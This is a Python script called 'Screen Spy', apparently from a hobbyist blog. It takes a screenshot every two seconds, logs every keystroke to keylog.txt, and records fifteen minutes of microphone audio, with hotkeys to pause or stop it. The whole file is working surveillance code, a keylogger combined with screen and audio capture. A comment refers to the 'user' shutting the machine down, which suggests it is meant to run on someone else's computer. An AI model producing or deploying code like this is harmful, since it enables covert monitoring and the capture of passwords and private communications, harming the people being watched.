"""Screen Spy V1.96.
   By Steve Shambles July 2019.
   Updated June 2020. Added record audio.
   https://stevepython.wordpress.com

pip3 install pyscreeze
pip3 install pynput
pip3 install keyboard
pip3 install wave
pip3 install Pyaudio

Note: hotkeys only work on Windows platform at moment:
-----------------
pause taking screenshots: Shift+Ctrl+1, then again to resume.
Stop taking screenshots : Shift+Ctrl+2
View images folder live : Shift+Ctrl+3
"""
from datetime import datetime
import logging
import os
import sys
import threading
import wave
import webbrowser as web

import keyboard as kb
import pyaudio
from pynput.keyboard import Listener
import pyscreeze


class Glo:
    """global store, this makes all these variables global, use glo.var"""
    sys_platform = ''
    save_folder = 'screens/'
    save_on = True
    stop_thread = False
    file_name = ''
    file_inc = 0
    image_count = 0
    grab_secs = 2
    max_images = 7200


# Get system platform.
Glo.sys_platform = sys.platform


def chk_folder():
    """Check a save folder exists, if not create one."""
    check_folder = os.path.isdir(Glo.save_folder)
    if not check_folder:
        os.mkdir(Glo.save_folder)


def view_images():
    """Opens file viewer in cwd folder, when Shift+Ctrl+3 pressed."""
    cwd = os.getcwd()
    web.open(cwd)


def toggle_save():
    """Toggles save images or not when Shift+Ctrl+1 pressed."""
    Glo.save_on = not Glo.save_on


def thread_stop():
    """Stops thread when Shift+Ctrl+2 pressed and tries to exit."""
    Glo.stop_thread = True
    sys.exit()


def check_file_exists():
    """If about to overwrite a file create a new folder using
       a unique timestamp and use that instead."""
    check_overwrite = os.path.isfile(Glo.save_folder+str(Glo.file_name))
    if check_overwrite:
        time_stamp = (datetime.now().strftime(r'%y%m%d%H%M%S/'))
        new_folder = (time_stamp)
        os.mkdir(new_folder)
        Glo.save_folder = new_folder


def grab_screen():
    """Grab image of the current desktop and save it."""
    Glo.file_inc += 1
    Glo.file_name = str(Glo.file_inc)+'-screenshot.jpg'

    if Glo.save_on and Glo.image_count < Glo.max_images:
        check_file_exists()
        pyscreeze.screenshot(Glo.save_folder+str(Glo.file_name))
        Glo.image_count += 1

    if not Glo.stop_thread:
        threading.Timer(Glo.grab_secs, grab_screen).start()


def keypress(Key):
    """key logger."""
    logging.info(str(Key))


def record_audio(RECORD_SECONDS, WAVE_OUTPUT_FILENAME):
    """Record microphone sounds to a WAV file.
       seconds to record, filename"""
    try:
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        CHUNK = 1024
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=CHUNK)
        frames = []
        for i in range(int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()
        waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        waveFile.setnchannels(CHANNELS)
        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
        waveFile.setframerate(RATE)
        waveFile.writeframes(b''.join(frames))
        waveFile.close()
    except:
        # No microphone found.
        return


# Had to omit hotkey use from linux version for now.
if not sys.platform.startswith('linux'):
    hotkey_pause = 'Shift+Ctrl+1'
    kb.add_hotkey(hotkey_pause, toggle_save, args=None)

    hotkey_stop = 'Shift+Ctrl+2'
    kb.add_hotkey(hotkey_stop, thread_stop, args=None)

    hotkey_view = 'Shift+Ctrl+3'
    kb.add_hotkey(hotkey_view, view_images, args=None)

# Start
logging.basicConfig(filename=('keylog.txt'),
                    level=logging.DEBUG,
                    format='%(asctime)s : %(message)s')
chk_folder()
grab_screen()

# Create unique file name for audio with time stamp.
audio_file_name = Glo.save_folder + (datetime.now()
                                     .strftime(r'%y%m%d%H%M%S'))+'.wav'

# Record from mic for 15 mins, 900 secs.
# Obviously change to how long you want to record for,
# but bear in mind that if user shuts down before time completed
# then no wav file will be saved.
record_audio(900, audio_file_name)

# Start detecting and recording keypresses.
with Listener(on_press=keypress) as listener:
    listener.join()
